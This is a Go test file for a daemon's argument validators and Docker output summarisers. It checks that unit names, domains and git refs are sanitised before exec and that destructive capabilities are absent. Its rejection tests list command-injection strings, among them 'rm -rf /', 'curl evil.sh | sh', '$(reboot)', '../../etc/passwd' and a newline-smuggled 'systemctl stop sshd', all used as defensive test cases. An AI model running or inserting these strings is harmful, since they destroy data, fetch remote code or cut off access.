package capability

import (
	"strings"
	"testing"
)

// The argument helpers are the last gate before exec. Everything they let
// through becomes a real argv entry on a real machine, so the cases that must
// fail are worth more tests than the ones that must pass.

func TestUnitRejectsAnythingThatIsNotAUnitName(t *testing.T) {
	refused := []string{
		"",
		"nginx; rm -rf /",
		"nginx && curl evil.sh | sh",
		"nginx\nsystemctl stop sshd",
		"../../etc/passwd",
		"$(reboot)",
		"`reboot`",
		"nginx|tee",
		"nginx > /etc/passwd",
		"ngin x",
	}
	for _, raw := range refused {
		if _, err := (Args{"unit": raw}).Unit(); err == nil {
			t.Errorf("accepted %q as a unit name", raw)
		}
	}
}

func TestUnitAcceptsRealNamesAndNamesThem(t *testing.T) {
	for raw, want := range map[string]string{
		"nginx":         "nginx.service",
		"nginx.service": "nginx.service",
		"my-app":        "my-app.service",
		"getty@tty1":    "getty@tty1.service",
		"docker.socket": "docker.socket",
	} {
		got, err := (Args{"unit": raw}).Unit()
		if err != nil {
			t.Fatalf("%q was refused: %v", raw, err)
		}
		if got != want {
			t.Errorf("%q became %q, wanted %q", raw, got, want)
		}
	}
}

func TestAnOverLongUnitIsRefused(t *testing.T) {
	long := ""
	for i := 0; i < 100; i++ {
		long += "a"
	}
	if _, err := (Args{"unit": long}).Unit(); err == nil {
		t.Error("accepted a 100-character unit name")
	}
}

func TestDomainRejectsWhatIsNotADomain(t *testing.T) {
	for _, raw := range []string{"", "example.com/../etc", "example com", "EXAMPLE.COM;ls", "a@b.com"} {
		if _, err := (Args{"domain": raw}).Domain(); err == nil {
			t.Errorf("accepted %q as a domain", raw)
		}
	}
	if got, err := (Args{"domain": "  Example.COM "}).Domain(); err != nil || got != "example.com" {
		t.Errorf("got %q (%v), wanted example.com", got, err)
	}
}

func TestRefRejectsShellAndPathEscapes(t *testing.T) {
	for _, raw := range []string{"", "main; rm -rf /", "main$(id)", "main|sh", "main branch"} {
		if _, err := (Args{"ref": raw}).Ref(); err == nil {
			t.Errorf("accepted %q as a git ref", raw)
		}
	}
	for _, raw := range []string{"main", "v1.2.3", "feature/checkout", "a3f9c2d"} {
		if _, err := (Args{"ref": raw}).Ref(); err != nil {
			t.Errorf("refused %q: %v", raw, err)
		}
	}
}

func TestLinesIsBoundedBothWays(t *testing.T) {
	if got := (Args{}).Lines(50, 200); got != 50 {
		t.Errorf("missing lines gave %d, wanted the fallback 50", got)
	}
	if got := (Args{"lines": float64(100000)}).Lines(50, 200); got != 200 {
		t.Errorf("an enormous request gave %d, wanted the cap 200", got)
	}
	if got := (Args{"lines": float64(-5)}).Lines(50, 200); got != 50 {
		t.Errorf("a negative request gave %d, wanted the fallback", got)
	}
	if got := (Args{"lines": "200"}).Lines(50, 200); got != 50 {
		t.Errorf("a string gave %d, wanted the fallback", got)
	}
}

func TestRegistryHasNoCapabilityThisBuildCannotRun(t *testing.T) {
	for name, spec := range Registry() {
		if spec.Run == nil {
			t.Errorf("%s has no implementation", name)
		}
		if spec.Name != name {
			t.Errorf("%s is filed under %s", spec.Name, name)
		}
		if spec.Tier != TierRead && spec.Tier != TierReversible {
			t.Errorf("%s has tier %q", name, spec.Tier)
		}
	}
}

func TestNothingDestructiveIsCompiledIn(t *testing.T) {
	// The far side never sends these. If one were ever added here, a breach of
	// the far side would be able to reach it — so the absence is asserted.
	for _, name := range []string{
		"db.drop", "volume.delete", "firewall.set", "ssh.keys",
		"agent.permissions", "shell.run",
	} {
		if Known(name) {
			t.Errorf("%s is implemented in the daemon and must not be", name)
		}
	}
}

// Which Docker failures are worth a second attempt through sudo, and which
// are an answer in themselves. Getting this wrong either hides a stopped
// Docker behind a permissions message or retries a question that was already
// answered properly.

func TestDockerRefusalsAreToldApart(t *testing.T) {
	denied := "Got permission denied while trying to connect to the Docker " +
		"daemon socket at unix:///var/run/docker.sock"
	down := "Cannot connect to the Docker daemon at unix:///var/run/docker.sock. " +
		"Is the docker daemon running?"

	if !refusedTheSocket(denied) {
		t.Error("a permission denial was not recognised as the socket refusing us")
	}
	if dockerIsDown(denied) {
		t.Error("a permission denial was reported as Docker being stopped")
	}

	if !refusedTheSocket(down) {
		t.Error("a stopped daemon was not recognised as worth one retry")
	}
	if !dockerIsDown(down) {
		t.Error("a stopped daemon was not recognised as such")
	}

	if refusedTheSocket("Error response from daemon: No such container: web") {
		t.Error("an ordinary Docker error was treated as a permissions problem")
	}
}

func TestContainersAreSummarisedByStateNotOrder(t *testing.T) {
	// Exactly what `docker ps --format {{.Names}}|{{.State}}|{{.Status}}|{{.Image}}`
	// prints. The separator is a pipe because a sudoers file can name a pipe
	// and cannot name a tab, so this is also the test that a change to it does
	// not quietly turn every container into one unparsed line.
	out := strings.Join([]string{
		"tutor_local-caddy-1|running|Up 2 days|caddy:2",
		"tutor_local-lms-1|running|Up 2 days (healthy)|overhangio/openedx:16",
		"tutor_local-mysql-1|exited|Exited (0) 3 hours ago|mysql:8",
	}, "\n")

	got := summariseContainers(out)

	if !strings.HasPrefix(got, "2 running:") {
		t.Errorf("did not count the running containers: %q", got)
	}
	if !strings.Contains(got, "tutor_local-lms-1 — Up 2 days (healthy)") {
		t.Errorf("dropped the health, which is the half a bare name hides: %q", got)
	}
	if !strings.Contains(got, "1 not running:\ntutor_local-mysql-1 — Exited (0) 3 hours ago") {
		t.Errorf("a stopped container was not listed apart: %q", got)
	}
}

func TestNoContainersIsAnAnswerRatherThanAnEmptyList(t *testing.T) {
	if got := summariseContainers("  \n"); !strings.Contains(got, "no containers") {
		t.Errorf("an empty Docker said %q", got)
	}
}

func TestTheHeaviestContainerComesFirst(t *testing.T) {
	// Exactly what `docker stats --no-stream --format
	// {{.Name}}|{{.MemUsage}}|{{.MemPerc}}|{{.CPUPerc}}` prints, in the order
	// Docker happens to give it — which is not the order anybody asking "which
	// one is eating the machine" wants to read.
	out := strings.Join([]string{
		"ws_redis|12.4MiB / 7.76GiB|0.16%|0.21%",
		"pocketloya_qdrant|1.2GiB / 7.76GiB|15.47%|3.90%",
		"ws_db|412MiB / 7.76GiB|5.18%|1.10%",
	}, "\n")

	got := summariseStats(out)

	first := strings.Split(got, "\n")[1]
	if !strings.HasPrefix(first, "pocketloya_qdrant") {
		t.Errorf("the heaviest container was not first: %q", first)
	}
	if !strings.Contains(got, "1.2GiB / 7.76GiB memory") {
		t.Errorf("dropped the measurement itself: %q", got)
	}
	if strings.Index(got, "ws_db") > strings.Index(got, "ws_redis") {
		t.Error("sorted by something other than memory")
	}
}

func TestAContainerWithNoPercentageIsKeptAndSortsLast(t *testing.T) {
	out := "weird|? / ?|--|--\nbusy|900MiB / 7.76GiB|11.3%|2%"

	got := summariseStats(out)

	if !strings.Contains(got, "weird") {
		t.Errorf("dropped a container rather than ranking it last: %q", got)
	}
	if strings.Index(got, "weird") < strings.Index(got, "busy") {
		t.Errorf("an unmeasurable container outranked a measured one: %q", got)
	}
}

func TestPartialOutputIsCountedAsAnAnswer(t *testing.T) {
	// The deadline reached mid-list leaves real rows in hand. Reporting "took
	// too long" while holding a list of containers is the least useful thing
	// this could do with it.
	if rows("ws_worker|running|Up About an hour (healthy)|wavesenda-worker") != 1 {
		t.Error("a real row was not recognised as one")
	}
	if rows("sudo: a password is required") != 0 {
		t.Error("an error message was counted as data")
	}
}
